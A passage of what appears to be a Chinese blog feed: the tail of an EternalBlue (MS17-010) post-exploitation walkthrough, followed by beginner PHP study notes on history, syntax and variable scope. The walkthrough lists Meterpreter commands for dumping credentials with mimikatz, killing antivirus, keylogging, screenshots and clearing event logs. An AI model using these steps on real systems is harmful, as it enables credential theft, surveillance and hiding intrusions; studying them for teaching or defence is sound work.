id="后渗透利用"><a href="#后渗透利用" class="headerlink" title="后渗透利用"></a>后渗透利用</h3><hr><ol><li><strong>使用 mimikatz 获取内存中的用户名和密码</strong></li></ol><pre><code>meterpreter &gt; load mimikatz Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to 'load kiwi' instead?Success.meterpreter &gt; kerberos [+] Running as SYSTEM[*] Retrieving kerberos credentialskerberos credentials====================AuthID    Package    Domain        User           Password------    -------    ------        ----           --------0;114889  NTLM       xxx1-PC       xxx1           0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  0;996     Negotiate  WORKGROUP     XXX1-PC$       0;53638   NTLM                                    0;999     NTLM       WORKGROUP     XXX1-PC$       </code></pre><ol start="2"><li><strong>查看系统信息</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">&gt;</span> sysinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li><strong>关闭杀毒软件</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">&gt;</span> run  killav<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li><strong>查看当前进程</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">&gt;</span> getpid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li><strong>捕获键盘数据</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">&gt;</span> keyscan_startmeterpreter <span class="token operator">&gt;</span> keyscan_dumpmeterpreter <span class="token operator">&gt;</span> keyscan_stop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="6"><li><strong>截屏</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">screenshot<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="7"><li><strong>清除事件日志</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">&gt;</span> clearev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><hr><p>([MS17-010的利用]<a href="https://www.jianshu.com/p/fefcdeb015be" target="_blank" rel="noopener">https://www.jianshu.com/p/fefcdeb015be</a>)</p><p><a href="https://zhuanlan.zhihu.com/p/26770020" target="_blank" rel="noopener">内网大杀器！Metasploit移植MS17-010漏洞代码模块利用</a></p><p><a href="https://blog.csdn.net/userpass_word/article/details/85124266]https://blog.csdn.net/userpass_word/article/details/85124266" target="_blank" rel="noopener">【漏洞利用】使用永恒之蓝的双倍脉冲模块（Eternalblue_doublepulsar）渗透攻击Win_7 32位主机</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> system security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> smb </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php学习笔记</title>
      <link href="/2020/01/19/php%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/01/19/php%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP-简介"><a href="#PHP-简介" class="headerlink" title="PHP 简介"></a>PHP 简介</h2><hr><p>PHP（全称：PHP：Hypertext Preprocessor，即“ PHP：超文本预处理器 ”）是一种开源的通用计算机脚本语言，尤其适用于网络开发并可嵌入 HTML 中使用。PHP 的主要目标是允许网络开发人员快速编写动态页面，但 PHP 也被用于其他很多领域。</p><p>PHP 的应用范围相当广泛，尤其是在网页程序的开发上。一般来说 PHP 大多运行在网页服务器上，透过运行 PHP 代码来产生用户浏览的网页。PHP 可以在多数的服务器和操作系统上运行，而且使用 PHP 完全是免费的。PHP 在 Windows 上有专门的官方移植编译项目，并且分多个 VC 编译器版本和线程安全特性来提供不同的版本支持。</p><h3 id="历史"><a href="#历史" class="headerlink" title="历史"></a>历史</h3><hr><p>PHP 原本的简称为 Personal Home Page，是拉斯姆斯·勒多夫为了要维护个人网页，而用 c 语言开发的一些 CGI 工具程序集，来取代原先使用的 Perl 程序。最初这些工具程序用来显示拉斯姆斯·勒多夫的个人履历，以及统计网页流量。他将这些程序和一些窗体解释器集成起来，称为 PHP/FI。PHP/FI 可以和数据库连接，产生简单的动态网页程序。</p><p>拉斯姆斯·勒多夫在 1995 年 6 月 8 日将 PHP/FI 公开发布，希望可以透过社群来加速程序开发与查找错误。这个发布的版本命名为 PHP 2。</p><p>在 1997 年，任职于 Technion IIT 公司的两个以色列程序员：Zeev Suraski 和 Andi Gutmans，重写了 PHP 的语法分析器，成为 PHP 3 的基础，而 PHP 也在这个时候改称为 PHP: Hypertext Preprocessor。经过几个月测试，开发团队在 1997 年 11 月发布了 PHP/FI 2，随后就开始 PHP 3 的开放测试，最后在 1998 年 6 月正式发布 PHP 3。</p><p>Zeev Suraski 和 Andi Gutmans 在 PHP 3 发布后开始改写 PHP 的核心，这个在 1999 年发布的语法分析器称为 Zend Engine，他们也在以色列的 Ramat Gan 成立了 Zend Technologies 来管理 PHP 的开发。在 2000 年 5 月 22 日，以 Zend Engine 1.0 为基础的 PHP 4 正式发布</p><p>2004 年 7 月 13 日则发布了 PHP 5，PHP 5则使用了第二代的 Zend Engine。</p><p>2008 年时，PHP 5 成为了 PHP 唯一维护中的稳定版本。</p><p>2015 年 12 月 3 日开发完 PHP 7。</p><h3 id="版本历程"><a href="#版本历程" class="headerlink" title="版本历程"></a>版本历程</h3><hr><table><thead><tr><th>颜色</th><th>代表意义</th></tr></thead><tbody><tr><td><font color="red">红色</font></td><td>过期版本；官方停止支持</td></tr><tr><td><font color="yellow">黄色</font></td><td>当前版本；官方仅提供安全问题修复</td></tr><tr><td><font color="green">绿色</font></td><td>当前版本；官方提供安全问题和一般问题的修复</td></tr><tr><td><font color="blue">蓝色</font></td><td>未来版本</td></tr><tr><td><br></td><td></td></tr></tbody></table><table><thead><tr><th>版本</th><th>发布日期</th><th>结束支持日期</th><th>说明</th></tr></thead><tbody><tr><td><font color="red">1.0</font></td><td>1995 年 6 月 8 日</td><td></td><td>正式名称为”Personal Home Page Tools (PHP Tools)”，第一次使用了”PHP”的名字。</td></tr><tr><td><font color="red">2.0</font></td><td>1996 年 4 月 16 日</td><td></td><td>针对PHP 1.0的改进版，速度更快、体积更小，更容易产生动态网页。</td></tr><tr><td><font color="red">3.0</font></td><td>1998 年 6 月 6 日</td><td>2000 年 10 月 20 日</td><td>开发方式改成多人共同参与。Zeev Suraski 和 Andi Gutmans 为了这个版本重写了剖析引擎。</td></tr><tr><td><font color="red">4.0</font></td><td>2000 年 5 月 22 日</td><td>2001 年 6 月 23 日</td><td>改成以 Zend 引擎作为语法分析器，具有两阶段剖析/标签剖析系统等先进功能。</td></tr><tr><td><font color="red">4.1</font></td><td>2001 年 12 月 10 日</td><td>2002 年 3 月 2 日</td><td>加入”超全局变量”（superglobals）功能，包含了$_GET、$_POST、$_SESSION 等。</td></tr><tr><td><font color="red">4.2</font></td><td>2002 年 4 月 22 日</td><td>2002 年 9 月 6 日</td><td>默认取消 register_globals 功能。从网络接收的数据将不会设置成全局变量，增加程序安全性。</td></tr><tr><td><font color="red">4.3</font></td><td>2002 年 12 月 27 日</td><td>2005 年 3 月 31 日</td><td>加入命令行可执行文件，称为 CLI，用以补充 CGI</td></tr><tr><td><font color="red">4.4</font></td><td>2005 年 7 月 11 日</td><td>2008 年 8 月 8 日</td><td>Added man pages for phpize and php-config scripts.</td></tr><tr><td><font color="red">5.0</font></td><td>2004 年 7 月 13 日</td><td>2005 年 9 月 5 日</td><td>推出有着新的对象模型的 Zend Engine II。</td></tr><tr><td><font color="red">5.1</font></td><td>2005 年 11 月 24 日</td><td>2006 年 8 月 24 日</td><td>在往重新设计的 PHP 引擎引入编译变量时做了性能提升。添加了PHP数据对象（PDO）作为访问数据库的统一接口。</td></tr><tr><td><font color="red">5.2</font></td><td>2006 年 11 月 2 日</td><td>2011 年 1 月 6 日</td><td>默认打开”过滤”的扩展。本地的JSON支持。</td></tr><tr><td><font color="red">5.3</font></td><td>2009 年 6 月 30 日</td><td>2014 年 8 月 14 日</td><td>支持名字空间;使用 XMLReader 和 XMLWriter 增强 XML 支持;支持 SOAP ,延迟静态绑定，跳转标签（有限的goto）, 闭包，Native PHP archives。</td></tr><tr><td><font color="red">5.4</font></td><td>2012 年 3 月 1 日</td><td>2015 年 9 月 3 日</td><td>支持 Trait、简短数组表达式。移除了 register_globals, safe_mode, allow_call_time_pass_reference, session_register(), session_unregister(), magic_quotes 以及 session_is_registered()。加入了内建的 Web 服务器。增强了性能，减小内存使用量。</td></tr><tr><td><font color="red">5.5</font></td><td>2013 年 6 月 20 日</td><td>2016 年 7 月 10 日</td><td>支持 generators，用于异常处理的 finally ，将 OpCache（基于 Zend Optimizer+）加入官方发布中。</td></tr><tr><td><font color="yellow">5.6</font></td><td>2014 年 8 月 28 日</td><td>2018 年 12 月 31 日</td><td>支持常量标量表达式、可变参数函数、指数运算符，增加 phpdbg SAPI、统一的默认字符集。</td></tr><tr><td><font color="yellow">6.x</font></td><td>未发布</td><td>不适用</td><td>取消掉的、从未正式发布的PHP版本。</td></tr><tr><td><font color="yellow">7.0</font></td><td>2015 年 12 月 3 日</td><td>2018 年 12 月 3 日</td><td>Zend Engine 3 (性能提升并在 Windows 上支持 64-bit 整数)，统一的变量语法， 基于抽象语法树编译过程。</td></tr><tr><td><font color="green">7.1</font></td><td>2016 年 12 月 1 日</td><td>2019 年 12 月 1 日</td><td>void 返回值类型，类常量可见性修饰符</td></tr><tr><td><font color="green">7.2</font></td><td>2017 年 11 月 30 日</td><td>2020 年 11 月 30 日</td><td></td></tr><tr><td><font color="green">7.3</font></td><td>2018 年 12 月 6 日</td><td>未表明</td><td></td></tr></tbody></table><h3 id="吉祥物"><a href="#吉祥物" class="headerlink" title="吉祥物"></a>吉祥物</h3><hr><p>PHP 项目的吉祥物名叫 “elePHPant”，PHP 的 logo 在一头蓝象的里面，由文森·庞蒂尔(Vincent Pontier)在 1998 年设计。</p><h3 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h3><hr><p>PHP 含有多个彩蛋，可以透过在域名的后面加上特殊字符串显示彩蛋。PHP 版本的不同，logo也会不同；不过该特性已经在 5.5 版本中被移除。</p><pre class="line-numbers language-text"><code class="language-text">?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 (PHP信息列表)?=PHPE9568F34-D428-11d2-A769-00AA001ACF42 (PHP的LOGO)?=PHPE9568F35-D428-11d2-A769-00AA001ACF42 (Zend LOGO)?=PHPE9568F36-D428-11d2-A769-00AA001ACF42 (PHP LOGO 蓝色大象)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="趣闻"><a href="#趣闻" class="headerlink" title="趣闻"></a>趣闻</h3><hr><p>PHP编程语言的官方文档中曾写过“PHP是世界上最好的语言，那其他的语言如何呢？”，因此其经常被华语圈的程序员调侃为是世界上最好的语言。</p><h2 id="PHP-语法"><a href="#PHP-语法" class="headerlink" title="PHP 语法"></a>PHP 语法</h2><h3 id="PHP-标记"><a href="#PHP-标记" class="headerlink" title="PHP 标记"></a>PHP 标记</h3><hr><ul><li><p>php 脚本可以放在文档中的任何位置。</p></li><li><p>php 脚本以 <code>&lt;?php</code> 开始， 以 <code>?&gt;</code> 结束。</p></li></ul><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token string">"hello word !"</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/24/J9MPnf8CNYQGpgq.png" alt="php-1.png"></p><ul><li>php 也允许使用短标记 <code>&lt;?</code> 和 <code>?&gt;</code> ，但是不建议使用。只有激活 php.ini 中的 <code>short_open_tag</code> 参数，php 才能使用短标记。</li></ul><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?</span><span class="token keyword">echo</span> <span class="token string">"hello word !"</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/24/QydPU74OhlxFapE.png" alt="php-2.png"></p><p><img src="https://i.loli.net/2019/11/24/SZRK3yvDYsiMLeN.png" alt="php-3.png"></p><ul><li>如果文件内容是纯 php 代码，最好在文件末尾删除 php 结束标记。避免在 php 结束标记后不小心加入空格或换行，导致 php 输出这些空白。</li></ul><h3 id="PHP-注释"><a href="#PHP-注释" class="headerlink" title="PHP 注释"></a>PHP 注释</h3><hr><p>PHP 代码中的注释不会被作为程序来读取和执行。它唯一的作用是供代码编辑者阅读。</p><p><strong>注释用于：</strong></p><ul><li><p>使其他人理解您正在做的工作 - 注释可以让其他程序员了解您在每个步骤进行的工作（如果您供职于团队）</p></li><li><p>提醒自己做过什么 - 大多数程序员都曾经历过一两年后对项目进行返工，然后不得不重新考虑他们做过的事情。注释可以记录您在写代码时的思路。</p></li></ul><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// 这是单行注释</span><span class="token shell-comment comment"># 这也是单行注释</span><span class="token comment" spellcheck="true">/*这是多行注释块它横跨了多行*/</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="PHP-大小写敏感"><a href="#PHP-大小写敏感" class="headerlink" title="PHP 大小写敏感"></a>PHP 大小写敏感</h3><hr><p>在 PHP 中，所有用户定义的函数、类和关键词（例如 if、else、echo 等等）都对大小写不敏感。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token string">"hello world!&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">ECHO</span> <span class="token string">"hello world!&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">Echo</span> <span class="token string">"hello world!&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/24/wTzD2OMmgqukobX.png" alt="php-4.png"></p><p>不过在 PHP 中，所有变量都对大小写敏感。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$color</span><span class="token operator">=</span><span class="token string">"red"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"my car is "</span> <span class="token punctuation">.</span> <span class="token variable">$color</span> <span class="token punctuation">.</span><span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"my house is "</span> <span class="token punctuation">.</span> <span class="token variable">$COLOR</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"my car is "</span> <span class="token punctuation">.</span> <span class="token variable">$Color</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/24/IXgDxWe12RbzJnV.png" alt="php-5.png"></p><h3 id="PHP-分隔符"><a href="#PHP-分隔符" class="headerlink" title="PHP 分隔符"></a>PHP 分隔符</h3><hr><p>同 C 或 Perl 一样，PHP 需要在每个语句后用分号结束指令。一段 PHP 代码中的结束标记隐含表示了一个分号；在一个 PHP 代码段中的最后一行可以不用分号结束。如果后面还有新行，则代码段的结束标记包含了行结束。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">echo</span> <span class="token string">"This is a test"</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string">"This is a test"</span> <span class="token delimiter">?&gt;</span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string">'We omitted the last closing tag'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="PHP-echo-print"><a href="#PHP-echo-print" class="headerlink" title="PHP echo/print"></a>PHP echo/print</h3><hr><p>echo 和 print 是 php 中的输出语句。</p><p><strong>echo 和 print 的区别：</strong></p><ul><li>echo：能够输出一个或多个字符串</li><li>print：只能输出一个字符串，并始终返回 1</li></ul><p>注：因为 echo 不返回值，所以 echo 执行速度比 print 稍快一些。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span><span class="token string">'c&lt;br&gt;'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 同时输出多个字符串</span><span class="token keyword">print</span> <span class="token string">'a'</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 只能输出一个字符串</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/30/cIJHy6Nf4xSwT3q.png" alt="php-6.png"></p><h2 id="PHP-变量"><a href="#PHP-变量" class="headerlink" title="PHP 变量"></a>PHP 变量</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><hr><ul><li>变量用一个美元符号（$）后面跟变量名来表示。</li><li>变量名称必须以字母或下划线开头</li><li>变量名称不能以数字开头</li><li>变量名称只能包含字母数字字符和下划线（A-z、0-9、下划线，以及 ASCII 字符从 127 到 255）</li><li>变量名是区分大小写的。</li></ul><p><strong>示例：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$var</span> <span class="token operator">=</span> <span class="token string">'Bob'</span><span class="token punctuation">;</span><span class="token variable">$Var</span> <span class="token operator">=</span> <span class="token string">'Joe'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"$var, $Var"</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// 输出 "Bob, Joe"</span><span class="token variable">$4site</span> <span class="token operator">=</span> <span class="token string">'not yet'</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 非法变量名；以数字开头</span><span class="token variable">$_4site</span> <span class="token operator">=</span> <span class="token string">'not yet'</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 合法变量名；以下划线开头</span><span class="token variable">$i</span>站点is <span class="token operator">=</span> <span class="token string">'mansikka'</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 合法变量名；可以用中文</span><span class="token keyword">echo</span> <span class="token variable">$4site</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$_4site</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$i</span>站点is<span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/30/pUYdNKynfkja67G.png" alt="phpvar-2.png"></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$var</span> <span class="token operator">=</span> <span class="token string">'Bob'</span><span class="token punctuation">;</span><span class="token variable">$Var</span> <span class="token operator">=</span> <span class="token string">'Joe'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"$var, $Var"</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// 输出 "Bob, Joe"</span><span class="token comment" spellcheck="true">///$4site = 'not yet';     // 非法变量名；以数字开头</span><span class="token variable">$_4site</span> <span class="token operator">=</span> <span class="token string">'not yet'</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 合法变量名；以下划线开头</span><span class="token variable">$i</span>站点is <span class="token operator">=</span> <span class="token string">'mansikka'</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 合法变量名；可以用中文</span><span class="token comment" spellcheck="true">//echo $4site;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$_4site</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$i</span>站点is<span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/30/jMaJ7QFkzl9OIL5.png" alt="phpvar-3.png"></p><h4 id="创建变量（变量初始化）"><a href="#创建变量（变量初始化）" class="headerlink" title="创建变量（变量初始化）"></a>创建变量（变量初始化）</h4><hr><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//如果变量赋的值是字符串，需要用引号包围该值。</span><span class="token variable">$txt</span><span class="token operator">=</span><span class="token string">"hello world!"</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span><span class="token variable">$y</span><span class="token operator">=</span><span class="token number">10.5</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$txt</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$x</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$y</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/30/FuTx6zZkXMhia8A.png" alt="phpvar-1.png"></p><p>php 变量的数据类型是不需要声明的，php 会根据它的值，自动把变量转换为正确的数据类型。</p><p>注：当你不初始化变量，变量会根据数据类型设置相应的默认值。例如：布尔值默认为 FALSE，整数和浮点数默认为 0，字符串为 null，数组为 empty array。</p><h3 id="PHP-变量的作用域"><a href="#PHP-变量的作用域" class="headerlink" title="PHP 变量的作用域"></a>PHP 变量的作用域</h3><hr><p>在 php 中，可以在脚本的任意位置对变量进行声明。变量的作用域指的是变量的生效范围，变量能被哪些脚本调用。</p><p>PHP 有三种不同的作用域：</p><ul><li>local（局部）</li><li>global（全局）</li><li>static（静态）</li></ul><h4 id="Local-和-Global-作用域"><a href="#Local-和-Global-作用域" class="headerlink" title="Local 和 Global 作用域"></a>Local 和 Global 作用域</h4><hr><p>函数之外声明的变量拥有 Global 作用域，只能在函数以外进行访问。</p><p>函数内部声明的变量拥有 LOCAL 作用域，只能在函数内部进行访问。</p><p>下面的例子测试了带有局部和全局作用域的变量：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 全局作用域</span><span class="token comment" spellcheck="true">//我们可以在不同的函数中创建名称相同的局部变量，因为局部变量只能被在其中创建它的函数识别。</span><span class="token keyword">function</span> <span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$y</span><span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 局部作用域</span>  <span class="token keyword">echo</span> <span class="token string">"&lt;p&gt;测试函数内部的变量：&lt;/p&gt;"</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string">"变量 x 是：$x"</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string">"变量 y 是：$y"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;p&gt;测试函数之外的变量：&lt;/p&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"变量 x 是：$x"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"变量 y 是：$y"</span><span class="token punctuation">;</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/30/EGXMPODyi4YqRkZ.png" alt="phpvar-4.png"></p><p><strong>注：</strong></p><p>什么是函数？</p><p>函数是可以在程序中重复使用的语句块。简单来说就是把写的多行代码，整合在一起，变成一块代码，并为它设个名称。</p><h4 id="PHP-global-关键词"><a href="#PHP-global-关键词" class="headerlink" title="PHP global 关键词"></a>PHP global 关键词</h4><hr><p>global 关键词用于在函数内访问全局变量，需要在（函数内部）变量前面使用 global 关键词：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span><span class="token variable">$y</span><span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">global</span> <span class="token variable">$x</span><span class="token punctuation">,</span><span class="token variable">$y</span><span class="token punctuation">;</span>  <span class="token variable">$y</span><span class="token operator">=</span><span class="token variable">$x</span><span class="token operator">+</span><span class="token variable">$y</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$y</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出 15</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/30/AC4OaHLMikKQ9o5.png" alt="phpvar-5.png"></p><p>PHP 同时在名为 $GLOBALS[index] 的数组中存储了所有的全局变量。下标存有变量名。这个数组在函数内也可以访问，并能够用于直接更新全局变量。</p><p>上面的例子可以这样重写：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span><span class="token variable">$y</span><span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'y'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">'y'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$y</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出 15</span><span class="token delimiter">?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/30/EWoHUxJadjsFLbZ.png" alt="phpvar-6.png"></p><h4 id="PHP-static-关键词"><a href="#PHP-static-关键词" class="headerlink" title="PHP static 关键词"></a>PHP static 关键词</h4><hr><p>通常，当函数完成/执行后，会删除所有变量。不过，有时我需要不删除某个局部变量。实现这一点需要首次声明变量时使用 static 关键词：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">myTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">static</span> <span class="token variable">$x</span><span class="token operator">=</span><span 